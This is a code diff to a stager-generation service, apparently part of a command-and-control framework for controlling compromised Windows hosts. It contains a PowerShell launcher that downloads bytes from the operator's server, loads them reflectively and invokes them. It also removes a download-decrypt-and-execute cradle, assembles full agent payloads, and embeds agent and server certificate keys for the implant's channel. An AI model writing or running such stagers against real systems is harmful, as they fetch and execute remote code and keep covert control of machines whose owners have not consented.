@@ -207,7 +207,7 @@ class StagerGenerationService:
         $wc=New-Object System.Net.WebClient;
         $bytes=$wc.DownloadData("{host}/download/{language}/{hop}");
         $assembly=[Reflection.Assembly]::load($bytes);
-        $assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);
+        $assembly.EntryPoint.Invoke($null,$null);
         """
 
         launcher = helpers.strip_powershell_comments(launcher)
@@ -683,18 +683,20 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             active_listener.options, language=language
         )
 
-        stager_code = active_listener.generate_stager(
-            active_listener.options, language=language, encrypt=False, encode=False
+        stager_code = (
+            active_listener.generate_stager(
+                active_listener.options, language=language, encrypt=False, encode=False
+            )
+            .replace("IEX ($e.GetString($agentBytes))", "")
+            .replace('Start-Negotiate -s "$ser"', 'Start-Negotiate -s "$Script:server"')
         )
 
-        launcher_code = active_listener.generate_launcher(
-            encode=False, language=language
-        ).replace(
-            "$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX",
-            "",
-        )
+        if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
+            full_agent = "\n".join([agent_code, stager_code, comms_code])
+        else:
+            full_agent = "\n".join([agent_code, stager_code])
 
-        return "\n".join([launcher_code, comms_code, stager_code, agent_code])
+        return full_agent
 
     def generate_stageless(self, options):
         listener_name = options["Listener"]["Value"]
@@ -747,6 +749,15 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             ),
             "DEFAULT_RESPONSE": base64.b64encode(
                 active_listener.default_response().encode("UTF-8")
+            ).decode("UTF-8"),
+            "AGENT_PRIVATE_CERT_KEY": base64.b64encode(
+                active_listener.agent_private_cert_key
+            ).decode("UTF-8"),
+            "AGENT_PUBLIC_CERT_KEY": base64.b64encode(
+                active_listener.agent_public_cert_key
+            ).decode("UTF-8"),
+            "SERVER_PUBLIC_CERT_KEY": base64.b64encode(
+                active_listener.server_public_cert_key
             ).decode("UTF-8"),
         }
 
